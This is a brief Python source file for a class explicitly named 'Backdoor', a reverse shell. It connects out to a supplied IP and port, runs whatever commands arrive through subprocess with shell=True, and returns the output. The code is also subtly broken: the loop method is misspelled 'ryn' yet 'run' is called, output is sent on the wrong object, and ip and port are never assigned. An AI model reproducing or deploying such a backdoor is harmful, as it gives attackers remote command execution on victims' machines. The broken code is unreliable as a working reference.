import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.connection.connect((self.ip, self.port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def ryn(self):
        try:
            while True:
                command = self.connection.recv(1024)     # listen port and waiting command
                command_result = self.execute_system_command(command)
                command.send(command_result)
                self.connection.send("\n [+] Connetction esteblished")

        except KeyboardInterrupt:
            self.connection.close()


if __name__ == "__main__":
    ip: str
    port: int

    backdoor = Backdoor(ip, port)
    backdoor.run( )

